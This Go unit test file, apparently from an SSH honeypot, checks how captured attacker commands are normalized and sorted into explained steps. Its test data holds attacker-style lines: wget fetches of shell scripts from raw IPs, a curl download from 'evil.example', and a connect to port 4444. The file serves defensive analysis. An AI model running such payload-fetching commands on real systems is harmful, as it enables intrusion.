package web

import (
	"testing"

	"github.com/k0braintheworld/k0pot/internal/model"
	"github.com/k0braintheworld/k0pot/internal/store"
)

func TestNormalizarComando(t *testing.T) {
	casos := map[string]string{
		"wget http://1.2.3.4/a.sh":      "wget <url>",
		"wget http://5.6.7.8/xyz":       "wget <url>",
		"curl -O http://evil.example/9": "curl -o <url>",
		"cat /tmp/e3b0c44298fc1c14":     "cat /tmp/<hex>",
		"connect 1.2.3.4 4444":          "connect <ip> <n>",
	}
	for in, want := range casos {
		if got := normalizarComando(in); got != want {
			t.Errorf("normalizar(%q) = %q, quiero %q", in, got, want)
		}
	}
	// Dos descargas distintas colapsan a la MISMA clave: se comparte glosa.
	if normalizarComando("wget http://1.1.1.1/a") != normalizarComando("wget http://9.9.9.9/b") {
		t.Fatal("dos descargas equivalentes deberian normalizar igual")
	}
}

func TestPasosGlosablesSoloComandos(t *testing.T) {
	ev := func(tipo model.TipoEvento, det map[string]string) model.Evento {
		return model.Evento{Tipo: tipo, Protocolo: "ssh", Detalle: det}
	}
	eventos := []model.Evento{
		ev(model.LoginExitoso, map[string]string{"usuario": "sally", "password": "1234"}),
		ev(model.ComandoEjecutado, map[string]string{"comando": "uname -s -v -n -r -m"}), // conocido
		ev(model.ComandoEjecutado, map[string]string{"comando": "frobnicate --zap 7"}),   // desconocido
	}
	pasos := pasosGlosables(store.EpisodioFila{}, eventos, "es")
	if len(pasos) != 3 {
		t.Fatalf("esperaba 3 pasos, hay %d", len(pasos))
	}
	if pasos[0].comando {
		t.Error("un login NO es un comando glosable")
	}
	if !pasos[1].comando || !pasos[1].conocido {
		t.Errorf("uname deberia ser comando conocido: %+v", pasos[1])
	}
	if !pasos[2].comando || pasos[2].conocido {
		t.Errorf("un comando raro deberia ser comando desconocido: %+v", pasos[2])
	}
}
